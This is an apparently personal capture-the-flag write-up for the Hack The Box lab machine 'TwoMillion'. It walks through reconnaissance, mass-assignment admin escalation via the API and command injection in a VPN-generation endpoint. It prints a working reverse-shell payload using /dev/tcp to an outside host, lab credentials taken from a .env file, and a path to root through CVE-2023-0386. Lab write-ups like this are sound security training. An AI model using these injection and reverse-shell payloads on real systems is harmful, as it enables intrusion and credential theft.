**Reconnaissance and Port Scanning**
**nmap --top-ports 100 -sV -sC 10.129.132.40 -oN nmap-TwoMillion**

Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-16 22:53 -0400
Nmap scan report for 10.129.132.40
Host is up (0.16s latency).
Not shown: 98 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.15 seconds

**Based on this information**
- We can deduce that there is a website
- SSH is exposed but there is no immediate version-based exploit identified.
- Keep it in mind as a potential access method if credentials are discovered later.

Website:
- The DNS takes you too this name resolved automatically http://2million.htb
	- So it must be added to /etc/hosts
		- echo "ip 2million.htb" | sudo tee -a /etc/hosts

- **curl -I http://2million.htb/**

- `PHPSESSID` is issued by the application. - The value appears random; no immediate session-manipulation vulnerability is apparent. - Keep the session for authenticated API requests.
	HTTP/1.1 405 Method Not Allowed
	Server: nginx
	Date: Thu, 17 Sep 2026 02:57:29 GMT
	Content-Type: text/html; charset=UTF-8
	Connection: keep-alive
	Set-Cookie: PHPSESSID=n2d0ibmhplvg8knglbm4g5fdpo; path=/
	Expires: Thu, 19 Nov 1981 08:52:00 GMT
	Cache-Control: no-store, no-cache, must-revalidate
	Pragma: no-cache

- Only two links and pages that seem interesting we have access too:

	- http://2million.htb/invite 
		- There is an input field that could be manipulated
	- http://2million.htb/login
		- A Login page

- Invite link gave the following information using the network packet inspector:
	- http://2million.htb/api/v1/invite/verify

- We probe the link
	- curl -s -X POST http://2million.htb/api/v1/invite/verify
		- {"0":400,"success":0,"error":{"message":"Missing parameter: code"}}
		- This does not tell us much except that it needs a code
- In the source code of the invite there's a JavaScript file that is interesting: view-source:http://2million.htb/js/inviteapi.min.js
	- It contains the following, and whats interesting here is makeInviteCode 
	- api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|
	  generate|verify
	- You can then go into your browser's console to run it on this link http://2million.htb/api/v1/invite/verify
		- makeInviteCode() 
			- Gives you the following:
			- Object { 0: 200, success: 1, data: {…}, hint: "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..." }
				inviteapi.min.js line 1 > eval:1:372
		- So in here we find out that they have encrypted a hint using the ROT13 standard, decrypted it says
			- In order to generate the invite code, make a POST request to /api/v1/invite/generate
		- curl -s -X POST http://2million.htb/api/v1/invite/generate              
			{"0":200,"success":1,"data":{"code":"VFoxNU4tUlJWMVAtS1hEV0MtVkw1RlY=","format":"encoded"}}    
			- Decode this code:
				- TZ15N-RRV1P-KXDWC-VL5FV
			- And then just setup up your user just with a random username and a fake email.
		- Only the following are accessible on the website
			- Dashboard, Rules, Change Log and Access
			- The Dashboard, Rules, and Change Log had no noticeable information
				- However inspecting packets under access gave us another form of api information
					- http://2million.htb/api/v1/user/vpn/regenerate
					- The only method that works is 'GET'
					- curl -s -i -X GET -b "PHPSESSID=s8q5icj0i64k5q6pemad9jlghg" http://2million.htb/api/v1/user/vpn/regenerate
					- Giving us the VPN generation which is most likely built upon the user's current session
		- After being authenticated you can also see ways too communicate with the API http://2million.htb/api/v1 this gives you more information
			- There are three admin api links:
				- admin	
					GET	
					/api/v1/admin/auth	"Check if user is admin"
					POST	
					/api/v1/admin/vpn/generate	"Generate VPN for specific user"
					PUT	
					/api/v1/admin/settings/update	"Update user settings"
			- We must test the boundaries of our access:
				- curl -i -s -b "PHPSESSID=<YOUR_COOKIE>" http://2million.htb/api/v1/admin/auth
					- {"message":false} As expected
					- curl -i -s http://2million.htb/api/v1/admin/auth (unauthenticated)
						- Unauthorized
			- Probing the admin settings update:
			- Trying too find out how you actually update it, like the parameters needed.
				- curl -i -s -X PUT -b "PHPSESSID=<YOUR_COOKIE>" \
				  -H "Content-Type: application/json" \
				  http://2million.htb/api/v1/admin/settings/update
					- {"status":"danger","message":"Missing parameter: email"}     
					  
				- curl -i -s -X PUT -b "PHPSESSID=<YOUR_COOKIE>" \
				  -H "Content-Type: application/json" \
				  -d '{}' \
				  http://2million.htb/api/v1/admin/settings/update
					- {"status":"danger","message":"Missing parameter: email"}  

			- Testing if it is exploitable for admin perms on the website:
				- curl -s -X PUT \
				  -b "PHPSESSID=<YOUR_COOKIE>" \
				  -H 'Content-Type: application/json' \
				  -d '{"email":"test@test.com"}' \
				  "http://2million.htb/api/v1/admin/settings/update"
					- {"status":"danger","message":"Missing parameter: is_admin"}    
				- curl -s -X PUT \
				  -b "PHPSESSID=<YOUR_COOKIE>"" \ 
				  -H 'Content-Type: application/json' \
				  -d '{"email":"test@test.com", "is_admin":1}' \  
				  "http://2million.htb/api/v1/admin/settings/update"
					- "id":13,"username":"test","is_admin":1}       

			- Now we test if we are truly admin:
				- curl -i -s -b "PHPSESSID=<YOUR_COOKIE>" http://2million.htb/api/v1/admin/auth
					- {"message":true}  
			- Test `/api/v1/admin/vpn/generate` as an administrator.
			  - Initial request:
			      curl -s -X POST \
			        -b "PHPSESSID=<YOUR_COOKIE>" \
			        "http://2million.htb/api/v1/admin/vpn/generate"
			  - Response:
			      {"status":"danger","message":"Invalid content type."}
			  - Looking at the api it needs a user too be added too it
			      "POST": {
			        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
			      },
			  Based on previous requests can determine its application/json
			- curl -s -X POST \
			  -b "PHPSESSID=<YOUR_COOKIE>" \
			  -H "Content-Type: application/json" \
			  -d '{}' \
			  "http://2million.htb/api/v1/admin/vpn/generate"
			- {"status":"danger","message":"Missing parameter: username"}  

		- Adding the username requested
			- curl -s -X POST \
			  -b "PHPSESSID=<YOUR_COOKIE>" \
			  -H "Content-Type: application/json" \
			  -d '{"username":"test"}' \
			  "http://2million.htb/api/v1/admin/vpn/generate"
		- It generates the VPN configuration after running this command
		- Generated certificate identifies: O=test CN=test
		- VPN endpoint: edge-eu-free-1.2million.htb:1337
			- But now we should test if this allows command injection
				- curl -s -X POST \
				  -b "PHPSESSID=fu3rna79tckmr0cpv7d60ia04e" \
				  -H "Content-Type: application/json" \
				  -d '{"username":"test;id;"}' \
				  "http://2million.htb/api/v1/admin/vpn/generate"
		- Command injection confirmed:
		    - Parameter: `username`
		    - Payload: `test;id;`
		    - Result:
		        uid=33(www-data) gid=33(www-data) groups=33(www-data)
		    - The server executes attacker-controlled shell commands.
		    - Command execution context: `www-data`
		- Since we confirmed command injection we must setup a listener
			- nc -lvnp 4444
			- The payload:
				- {"username":"test;bash -c 'bash -i >& /dev/tcp/10.10.15.150/4444 0>&1';"}
				- Do this in Burp as shell can be a bit tricky with the payload
		- Now that we have a shell
			- We must see who we are
				- whoami
					- www-data
				- hostname
					- 2million
			- Also list contents for anything useful
				- ls -a
						.env
						Database.php
						Router.php
						VPN
						assets
						controllers
						css
						fonts
						images
						index.php
						js
						views

				- Found a .env file we can read in this folder
					- cat .env
						DB_HOST=127.0.0.1
						DB_DATABASE=htb_prod
						DB_USERNAME=admin
						DB_PASSWORD=SuperDuperPass123
				- We first test for credential reuse
				    - SSH:
				        - Username: admin
				        - Password: SuperDuperPass123
				        - Target: 2million.htb
				    - Credentials work
				    - We gain an SSH shell as `admin`
				    - This gives us a higher-privileged user shell than the initial `www-data` foothold
				- The `user.txt` flag is in the directory that the SSH shell spawns in.
				
				- Initial privilege-escalation enumeration:
				    - `sudo -l`
				        - Nothing useful found
				    - `getcap -r / 2>/dev/null`
				        - Nothing useful found
				    - `find / -perm -4000 -type f 2>/dev/null`
				        - Nothing immediately useful found
				
				- Next: physically explore the system to identify anything unusual or overlooked:
				    - Check the current user's home directory:
				        - `ls -la ~`
				    - Check other users:
				        - `ls -la /home`
				        - `cat /etc/passwd`
				    - Inspect interesting files/directories:
				        - `/opt`
				        - `/var/www`
					        - contains the websites files
				        - `/var/backups`
				        - `/tmp`
				        - `/var/tmp`
				    - Look for configuration files, scripts, credentials, keys, backups, or unusual executables.
				    - Check running processes/services for anything owned by root that may be relevant.
				    - Check scheduled tasks/cron jobs.
				    - Check writable files/directories that are executed by privileged processes.
				- Checking the mail gives us insight too what vulnerability it suffers from as it states the OverlayFS/Fuse must be patched on their system.
				- What has been found that may contain an actual useful information is the OS version
					- Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
					- cat /etc/os-release
						PRETTY_NAME="Ubuntu 22.04.2 LTS"
						NAME="Ubuntu"
						VERSION_ID="22.04"
						VERSION="22.04.2 LTS (Jammy Jellyfish)"
						VERSION_CODENAME=jammy
						ID=ubuntu
						ID_LIKE=debian
						HOME_URL="https://www.ubuntu.com/"
						SUPPORT_URL="https://help.ubuntu.com/"
						BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
						PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
						UBUNTU_CODENAME=jammy
				- `unshare -Ur true` returns exit code `0`, confirming an important prerequisite for the exploitation path.
				- This gives us insights too possibly a CVE that this version suffers from.
					- CVE-2023-0386 - This is the OverlayFS Local Privilege Escalation vulnerability that this Linux Version is vulnerable too.
						- Using the PoC and following the usage guide too get privesc.
			- Successful exploitation provides root access.
			  - Thereafter you can confirm you are root
				  - whoami
					  - root
				  - Then you can just cat /root/root.txt after confirming

**The flow of TwoMillion**

- Gathering of information: basic info like an Nmap scan to find the open ports and then exploring the website to understand how it operates and where there could be a vulnerability.
- You'll discover the `/invite` page and inspect the JavaScript/API functionality, which reveals that an invite code can be generated through `/api/v1/invite/generate`.
- Generating an invite code allows you to register an account and access the authenticated parts of the website.
- You'll then enumerate the API endpoints and discover an admin endpoint for updating user settings.
- Testing this endpoint reveals a **mass assignment vulnerability**, as you can supply `is_admin=1` yourself and promote your account to administrator.
- With admin access, you'll discover the `/api/v1/admin/vpn/generate` endpoint, which takes a `username` parameter.
- Testing this parameter with shell characters reveals **command injection**, allowing you to execute commands on the server as `www-data`.
- From the command injection, you'll obtain a reverse shell as `www-data` and begin the usual local enumeration.
- You'll find the `.env` file containing database credentials. The password is also reused for the local `admin` account, allowing you to SSH into the machine as `admin`.
- The user flag is located in the directory where your SSH shell spawns.
- You'll then perform the routine privilege-escalation checks such as `sudo -l`, SUID binaries, capabilities, writable files, etc. Nothing immediately useful is found.
- You'll eventually find a local email containing a clue about upgrading the web host because of an **OverlayFS / FUSE** vulnerability.
- Checking the system shows Ubuntu 22.04.2 with kernel `5.15.70`, and `unshare -Ur true` succeeds, which confirms an important prerequisite for the OverlayFS/FUSE exploit.
- This points towards **CVE-2023-0386**, a local privilege-escalation vulnerability involving OverlayFS and FUSE.
- After transferring and compiling the PoC, you'll run it using two SSH sessions and successfully escalate from `admin` to root.
- Then from there you can simply go to the root folder and retrieve the root flag.